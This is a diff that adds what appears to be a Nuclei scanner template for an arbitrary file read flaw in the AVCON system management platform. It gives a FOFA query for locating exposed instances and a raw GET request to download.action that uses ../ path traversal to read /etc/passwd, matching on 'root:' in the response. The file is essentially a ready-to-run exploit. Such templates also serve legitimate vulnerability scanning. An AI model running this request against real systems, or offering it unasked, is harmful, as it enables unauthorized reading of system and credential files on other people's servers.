@@ -1,0 +1,23 @@
+id: AVCON-download_action-File-reading
+
+info:
+  name: AVCON-系统管理平台 download.action 任意文件读取漏洞
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="AVCON-系统管理平台"
+  tags: File Reading
+
+
+http:
+  - raw:
+      - |
+        GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'root:')"
